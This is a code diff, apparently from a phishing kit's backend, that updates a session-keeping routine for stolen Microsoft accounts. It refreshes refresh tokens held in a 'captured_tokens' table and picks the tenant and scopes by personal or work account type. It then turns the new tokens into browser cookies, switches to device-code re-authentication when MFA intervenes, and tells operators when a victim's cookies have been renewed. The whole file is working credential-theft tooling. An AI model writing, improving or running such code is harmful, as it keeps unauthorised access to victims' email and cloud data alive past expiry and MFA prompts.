@@ -10,7 +10,7 @@ async function runRenewalCycle() {
 
   // Pre-emptive renewal: renew cookies that are about to expire (within 6 hours)
   const [expiringSoon] = await db.query(
-    `SELECT ct.*, u.subscription_status, u.subscription_expiry, l.template_type
+    `SELECT ct.*, u.subscription_status, u.subscription_expiry, l.template_type, ct.account_type
      FROM captured_tokens ct
      JOIN users u ON ct.user_id = u.id
      LEFT JOIN links l ON ct.link_id = l.id
@@ -31,7 +31,7 @@ async function runRenewalCycle() {
 
   // Regular renewal: cookies that have expired or are in renewal window
   const [expired] = await db.query(
-    `SELECT ct.*, u.subscription_status, u.subscription_expiry, l.template_type
+    `SELECT ct.*, u.subscription_status, u.subscription_expiry, l.template_type, ct.account_type
      FROM captured_tokens ct
      JOIN users u ON ct.user_id = u.id
      LEFT JOIN links l ON ct.link_id = l.id
@@ -64,32 +64,47 @@ async function renewSingleCapture(capture, isPreemptive = false) {
       await sleep(attemptDelay);
     }
 
-    // Use stored tenant from capture row (set at capture time), fallback to config or jwt_payload
+    // Detect account type for proper endpoint/scope selection
+    let accountType = capture.account_type || 'work_school';
+    if (accountType === 'unknown') accountType = 'work_school';
+    const isPersonal = accountType === 'personal';
+
+    // Use stored tenant from capture row (set at capture time)
     let tenant = capture.tenant || 'common';
-    if (!tenant || tenant === 'common') {
-      try {
-        if (capture.link_id) {
+    
+    // For personal accounts, use consumers endpoint exclusively
+    if (isPersonal) {
+      tenant = 'consumers';
+    } else if (tenant === 'common') {
+      // Try to get tenant from link jwt_payload for work accounts
+      if (capture.link_id) {
+        try {
           const [links] = await db.query('SELECT jwt_payload FROM links WHERE id = ?', [capture.link_id]);
           if (links.length && links[0].jwt_payload) {
             try {
               const parsed = JSON.parse(links[0].jwt_payload);
               if (parsed.tenant) tenant = parsed.tenant;
-            } catch (e) { /* use default */ }
+            } catch (e) {}
           }
-        }
-      } catch (e) { /* use default */ }
+        } catch (e) {}
+      }
     }
 
-    // Call Microsoft token endpoint with refresh token using the correct tenant
+    // Build correct scope per account type
+    const scope = isPersonal 
+      ? 'openid profile email offline_access' 
+      : 'https://graph.microsoft.com/.default offline_access openid profile';
+
+    // Call Microsoft token endpoint with refresh token using correct account-specific settings
     const response = await axios.post(
       `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
       new URLSearchParams({
         grant_type: 'refresh_token',
         refresh_token: refreshToken,
         client_id: config.AZURE_CLIENT_ID,
-        scope: 'openid profile email offline_access https://graph.microsoft.com/.default',
+        scope: scope,
       }),
-      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+      { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 30000 }
     );
 
     const newAccessToken = response.data.access_token;
@@ -98,16 +113,17 @@ async function renewSingleCapture(capture, isPreemptive = false) {
     // Check for soft errors (AADSTS50076 - interaction required)
     const errorCode = response.data.error_code || response.data.error;
     if (errorCode === '50076' || errorCode === 'interaction_required' || response.data.error === 'interaction_required') {
-      // Switch to device code flow for re-authentication
       await handleSoftError(capture, newAccessToken, newRefreshToken);
       return { success: false, error: 'Soft error - switched to device code flow', soft_error: true };
     }
 
-    // Convert to cookies with multiple domain support, using the capture's stored tenant
+    // Convert to cookies with account-type awareness
     const cookieResult = await convertTokensToCookies(
       newAccessToken,
       capture.template_type || 'office',
-      capture.tenant || 'common'
+      tenant,
+      capture.email,
+      accountType
     );
 
     if (cookieResult.success && cookieResult.cookies) {
@@ -120,10 +136,16 @@ async function renewSingleCapture(capture, isPreemptive = false) {
          SET access_token_encrypted = ?, refresh_token_encrypted = ?,
              cookies_encrypted = ?, expiration = DATE_ADD(NOW(), INTERVAL ? HOUR),
              last_renewed = NOW(), renewal_count = renewal_count + 1,
-             renewal_attempts = 0, stale = 0
+             account_type = ?, stale = 0
          WHERE id = ?`,
-        [encrypt(newAccessToken), encrypt(newRefreshToken), encrypt(cookieResult.cookies),
-         ttlHours, capture.id]
+        [
+          encrypt(newAccessToken),
+          encrypt(newRefreshToken),
+          encrypt(cookieResult.cookies),
+          ttlHours,
+          accountType,
+          capture.id
+        ]
       );
 
       // Log renewal
@@ -138,22 +160,20 @@ async function renewSingleCapture(capture, isPreemptive = false) {
         : `🔄 Cookies renewed for capture #${capture.id}`;
       await notifyUser(capture.user_id, message);
 
-      return { success: true, cookies: cookieResult.cookies };
+      return { success: true, cookies: cookieResult.cookies, account_type: accountType };
     } else {
       await handleRenewalFailure(capture, cookieResult.error);
       return { success: false, error: cookieResult.error };
     }
   } catch (err) {
+    console.error('[SessionKeeper] Renewal error:', err.message);
     await handleRenewalFailure(capture, err.message);
     return { success: false, error: err.message };
   }
 }
 
 async function handleSoftError(capture, accessToken, refreshToken) {
-  // When we get a soft error (AADSTS50076), we need to re-authenticate the user
-  // This typically happens when MFA or additional verification is required
   try {
-    // Store the updated tokens even though we got a soft error
     await db.query(
       `UPDATE captured_tokens
        SET access_token_encrypted = ?, refresh_token_encrypted = ?,
@@ -163,13 +183,11 @@ async function handleSoftError(capture, accessToken, refreshToken) {
       [encrypt(accessToken), encrypt(refreshToken), capture.id]
     );
 
-    // Log the soft error
     await db.query(
       'INSERT INTO cookie_renewals (capture_id, user_id, success, ip_address, error_message, renewal_type) VALUES (?, ?, 0, ?, ?, ?)',
       [capture.id, capture.user_id, '127.0.0.1', 'Soft error: AADSTS50076 - re-authentication required', 'soft_error']
     );
 
-    // Notify user that re-authentication is needed
     await notifyUser(capture.user_id, `⚠️ Re-authentication required for capture #${capture.id}. Please log in again.`);
   } catch (err) {
     console.error('Error handling soft error:', err);
@@ -193,7 +211,7 @@ async function handleRenewalFailure(capture, errorMessage = 'Renewal failed') {
   );
 }
 
-async function markStale(captureId, reason) {
+async function markStale(captureId) {
   await db.query('UPDATE captured_tokens SET stale = 1 WHERE id = ?', [captureId]);
 }
 
@@ -224,8 +242,6 @@ async function notifyUser(userId, message) {
     // Email notification (if SMTP is configured)
     if (user.notify_login && user.email) {
       try {
-        // Email notification would be implemented here if nodemailer is configured
-        // For now, we'll just log it
         console.log(`Email notification for user ${userId}: ${message}`);
       } catch (e) {
         console.error('Email notification failed:', e.message);
@@ -246,14 +262,15 @@ async function getRenewalStats(userId, captureId = null) {
         SUM(CASE WHEN success = 0 THEN 1 ELSE 0 END) as failed_renewals,
         MAX(created_at) as last_renewal_attempt
       FROM cookie_renewals
-      WHERE user_id = ?
-    `;
+      WHERE user_id = ?`;
     const params = [userId];
 
     if (captureId) {
       query += ' AND capture_id = ?';
       params.push(captureId);
     }
+
+    query += '';
 
     const [stats] = await db.query(query, params);
     return stats[0] || {};
